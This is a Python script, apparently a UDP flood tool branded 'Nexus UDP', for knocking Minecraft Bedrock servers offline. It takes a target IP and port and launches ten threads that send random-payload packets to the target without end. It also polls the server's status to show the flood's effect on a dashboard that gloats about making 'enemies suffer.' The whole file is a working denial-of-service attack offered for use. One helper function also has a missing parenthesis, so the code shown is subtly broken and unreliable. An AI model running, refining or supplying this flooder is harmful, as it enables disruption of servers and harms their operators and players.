import socket
import time
import os
import random
import threading

RED = "\033[91m"
LRED = "\033[38;5;196m"
WHITE = "\033[97m"
GRAY = "\033[90m"
RESET = "\033[0m"
BOLD = "\033[1m"

# ASCII Nexus UDP @NexusTeam 2026 - 2026
ASCII_ART = r"""
 ███▄    █ ▓█████ ▒██   ██▒ █    ██   ██████     █    ██ ▓█████▄  ██▓███  
 ██ ▀█   █ ▓█   ▀ ▒▒ █ █ ▒░ ██  ▓██▒▒██    ▒     ██  ▓██▒▒██▀ ██▌▓██░  ██▒
▓██  ▀█ ██▒▒███   ░░  █   ░▓██  ▒██░░ ▓██▄      ▓██  ▒██░░██   █▌▓██░ ██▓▒
▓██▒  ▐▌██▒▒▓█  ▄  ░ █ █ ▒ ▓▓█  ░██░  ▒   ██▒   ▓▓█  ░██░░▓█▄   ▌▒██▄█▓▒ ▒
▒██░   ▓██░░▒████▒▒██▒ ▒██▒▒▒█████▓ ▒██████▒▒   ▒▒█████▓ ░▒████▓ ▒██▒ ░  ░
░ ▒░   ▒ ▒ ░░ ▒░ ░▒▒ ░ ░▓ ░░▒▓▒ ▒ ▒ ▒ ▒▓▒ ▒ ░   ░▒▓▒ ▒ ▒  ▒▒▓  ▒ ▒▓▒░ ░  ░
░ ░░   ░ ▒░ ░ ░  ░░░   ░▒ ░░░▒░ ░ ░ ░ ░▒  ░ ░   ░░▒░ ░ ░  ░ ▒  ▒ ░▒ ░     
   ░   ░ ░    ░    ░    ░   ░░░ ░ ░ ░  ░  ░      ░░░ ░ ░  ░ ░  ░ ░░       
         ░    ░  ░ ░    ░     ░           ░        ░        ░             
                                                          ░                
"""

def center(text, width=80):
    lines = text.splitlines()
    centered = []
    for line in lines:
        pad = max(0, (width - len(line))
        centered.append(' ' * pad + line)
    return '\n'.join(centered)

# Función Para Acceder A API De Server Status ( IP - Port - Motd - Users - Ping )
def get_mcpe_status(ip, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(1.5)
        payload = bytes([0x01]) + int(time.time() * 1000).to_bytes(8, 'big') + b'\x00' * 8
        sock.sendto(payload, (ip, port))
        data, _ = sock.recvfrom(2048)
        sock.close()

        if data.startswith(b'\x1c'):
            parts = data.split(b';')
            if len(parts) >= 6:
                motd = parts[1].decode(errors='ignore')[:25]
                online = parts[4].decode()
                maxp = parts[5].decode()
                ping = int((time.time() * 1000) - int.from_bytes(data[1:9], 'big'))
                return motd, f"{online}/{maxp}", f"{ping}ms"
        return "N/A", "N/A", "N/A"
    except:
        return "Offline", "N/A", "N/A"

# Forma de Ataque
def attack(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        len_ = random.randint(256, 512)
        payload = os.urandom(len_)
        s.sendto(payload, (ip, port))

if __name__ == "__main__":
    os.system("clear")

    print(f"\n{LRED}{BOLD}")
    print(center(ASCII_ART.strip(), 80))
    print(f"{RESET}\n")

    print(f"{GRAY}{center('Coded By @eduxz_gx', 80)}{RESET}\n\n")

    ip = input(f"{WHITE}IP → {RESET}").strip()
    port = int(input(f"{WHITE}PORT → {RESET}").strip())

    os.system("clear")

    start_time = time.time()

    for i in range(10):
        t = threading.Thread(target=attack, args=(ip, port), daemon=True)
        t.start()

    while True:
        elapsed = int(time.time() - start_time)
        motd, online, ping = get_mcpe_status(ip, port)

        os.system("clear")

        print(f"{RED}{'═' * 78}{RESET}")
        print("")
        print(f"{LRED}{BOLD}{center('ATTACK SUCCESSFULLY SENT', 80)}{RESET}")
        print("")

        print(f"{LRED}{BOLD}")
        print(center(ASCII_ART.strip(), 80))
        print(f"{RESET}\n")

        print(f"{RED}═══════════════════════════════════════════════════════════════════════════════{RESET}")
        print(f"{RED}║ {GRAY}\"Make your enemies suffer and beg for mercy. \" - by eduxz_gx{RESET} {RED}║{RESET}")
        print(f"{RED}╠══════════════════════════════════════════════════════════════════════════════╣{RESET}")

        print(f"{RED}║{RESET} Status     {RED}│{WHITE} [ Attack Enviado ]{RESET}{' '*38}{RED}║{RESET}")
        print(f"{RED}║{RESET} Target     {RED}│{WHITE} [ {ip:<15} ]{RESET}{' '*38}{RED}║{RESET}")
        print(f"{RED}║{RESET} Port       {RED}│{WHITE} [ {str(port):<6} ]{RESET}{' '*43}{RED}║{RESET}")
        print(f"{RED}║{RESET} Elapsed    {RED}│{WHITE} [ {elapsed:3d} s ]{RESET}{' '*41}{RED}║{RESET}")
        print(f"{RED}║{RESET} Method     {RED}│{WHITE} [ game ]{RESET}{' '*47}{RED}║{RESET}")
        print(f"{RED}╠══════════════════════════════════════════════════════════════════════════════╣{RESET}")
        print(f"{RED}║{RESET} MOTD       {RED}│{WHITE} {motd}{RESET}{' ' * (35 - len(motd))}{RED}║{RESET}")
        print(f"{RED}║{RESET} ONLINE     {RED}│{WHITE} {online}{RESET}{' ' * (35 - len(online))}{RED}║{RESET}")
        print(f"{RED}║{RESET} PING       {RED}│{WHITE} {ping}{RESET}{' ' * (35 - len(ping))}{RED}║{RESET}")
        print(f"{RED}╚══════════════════════════════════════════════════════════════════════════════╝{RESET}")

        time.sleep(1)